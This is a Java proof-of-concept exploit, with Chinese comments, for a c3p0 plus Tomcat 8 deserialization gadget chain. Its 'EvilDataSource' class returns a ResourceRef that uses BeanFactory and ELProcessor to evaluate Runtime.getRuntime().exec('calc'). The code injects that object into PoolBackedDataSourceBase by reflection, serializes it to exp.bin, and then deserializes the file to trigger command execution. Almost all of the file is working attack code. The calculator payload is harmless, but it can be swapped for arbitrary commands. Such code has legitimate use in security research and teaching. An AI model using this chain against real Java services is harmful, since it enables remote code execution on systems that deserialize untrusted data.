package Seri.C3p0;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class C3P0_Tomcat8 {

    // 恶意类，返回构造的 ResourceRef
    public static class EvilDataSource implements ConnectionPoolDataSource, Referenceable {

        @Override
        public Reference getReference() throws NamingException {
            ResourceRef ref = new ResourceRef(
                    "javax.el.ELProcessor",
                    null, null, null,
                    true,
                    "org.apache.naming.factory.BeanFactory",
                    null
            );

            // 触发 EL 表达式执行
            ref.add(new StringRefAddr("forceString", "faster=eval"));
            ref.add(new StringRefAddr("faster", "Runtime.getRuntime().exec(\"calc\")"));
            return ref;
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {}

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {}

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }

    // 序列化为 exp.bin
    public static void serializeExploit(ConnectionPoolDataSource payload) throws Exception {
        PoolBackedDataSourceBase obj = new PoolBackedDataSourceBase(false);
        Field field = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(obj, payload);

        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("exp.bin"))) {
            oos.writeObject(obj);
            System.out.println("[+] Exploit serialized to exp.bin");
        }
    }

    // 触发反序列化
    public static void deserializeExploit() throws Exception {
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream("exp.bin"))) {
            ois.readObject();
            System.out.println("[+] Deserialization triggered");
        }
    }

    public static void main(String[] args) throws Exception {
        // 构造并序列化 payload
        EvilDataSource evil = new EvilDataSource();
        serializeExploit(evil);

        // 触发反序列化执行（弹计算器）
        deserializeExploit();
    }
}
